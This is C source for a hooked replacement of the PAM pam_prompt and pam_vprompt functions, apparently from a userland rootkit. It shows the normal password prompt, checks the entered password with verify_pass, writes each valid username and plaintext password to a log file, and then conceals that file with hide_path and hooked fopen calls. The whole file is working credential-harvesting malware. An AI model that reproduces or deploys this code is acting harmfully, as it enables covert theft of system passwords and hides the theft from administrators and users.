int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt, va_list args){
    struct pam_message msg;
    struct pam_response *pam_resp = NULL;
    const struct pam_message *pmsg;
    const struct pam_conv *conv;
    const void *convp;
    char *msgbuf, *user = get_username(pamh);
    int retval;
    FILE *logpath_fp;

    hook(CFOPEN);

    if(response) *response = NULL;
    if((retval = pam_get_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS) return retval;

    if((conv = convp) == NULL || conv->conv == NULL){
        pam_syslog(pamh, LOG_ERR, "no conversation function");
        return PAM_SYSTEM_ERR;
    }

    if(vasprintf(&msgbuf, fmt, args) < 0){
        pam_syslog(pamh, LOG_ERR, "vasprintf: %m");
        return PAM_BUF_ERR;
    }

    msg.msg_style = style;
    msg.msg = msgbuf;
    pmsg = &msg;
    retval = conv->conv(1, &pmsg, &pam_resp, conv->appdata_ptr);
    if(response) *response = pam_resp == NULL ? NULL : pam_resp->resp;
    if(retval != PAM_SUCCESS) return retval;

    if(pam_resp->resp != NULL && verify_pass(user, pam_resp->resp)){
        if((logpath_fp = call(CFOPEN, LOG_PATH, "a")) == NULL) goto _end_pam_vprompt;

        fprintf(logpath_fp, LOG_FMT, user, pam_resp->resp);
        fclose(logpath_fp);
        hide_path(LOG_PATH);
    }

_end_pam_vprompt:
    _pam_overwrite(msgbuf);
    _pam_drop(pam_resp);
    free(msgbuf);
    return retval;
}

int pam_prompt(pam_handle_t *pamh, int style, char **response, const char *fmt, ...){
    va_list args;
    int retval;
    va_start(args, fmt);
    retval = pam_vprompt(pamh, style, response, fmt, args);
    va_end(args);
    return retval;
}
